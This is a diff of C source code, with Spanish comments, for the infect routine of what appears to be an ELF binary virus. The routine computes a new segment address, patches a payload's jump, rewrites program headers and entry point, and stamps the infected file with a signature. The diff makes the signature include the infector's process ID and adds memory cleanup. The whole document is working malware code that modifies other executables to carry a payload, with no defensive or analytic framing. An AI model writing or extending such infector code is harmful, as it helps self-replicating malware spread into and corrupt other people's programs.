@@ -93,8 +93,9 @@ int     ft_is_infection(t_war *war)
 
 void    ft_infect(t_war *war)
 {
+    pid_t           pid;
     unsigned char   *payload;
-    char            full_signature[1069];
+    char            *full_signature;
     uint64_t        new_vaddr;
     Elf64_Phdr      *phdr;
     Elf64_Addr      new_entry;
@@ -154,8 +155,14 @@ void    ft_infect(t_war *war)
     new_vaddr = (max_vaddr + 0xfff) & ~0xfff;
     e_phnum_save = war->header->e_phnum;
 
-    // 5. Preparar la firma real
-    snprintf(full_signature, sizeof(full_signature), "%s39774", war->decrypted);
+    // 5. Añadir el FINGERPRINT a la firma
+    pid = getpid();
+    if (pid < 0)
+        return;
+    full_signature = malloc(strlen(war->decrypted) + 16);
+    if (!full_signature)    
+        return;
+    snprintf(full_signature, strlen(war->decrypted) + 16, "%s%d", war->decrypted, (int)pid);
     sig_len = strlen(full_signature);
 
     // 6. Parchear el salto delta en el payload
@@ -198,6 +205,7 @@ void    ft_infect(t_war *war)
     war->fd = open(war->binary, O_RDWR | O_NOFOLLOW);
     if (war->fd == -1)
     {
+        free(full_signature);
         free(payload);
         free(phdr_table_copy);
         return;
@@ -252,6 +260,7 @@ void    ft_infect(t_war *war)
 
     // 12. Limpieza de recursos
     close(war->fd);
+    free(full_signature);
     free(payload);
     free(phdr_table_copy);
 }
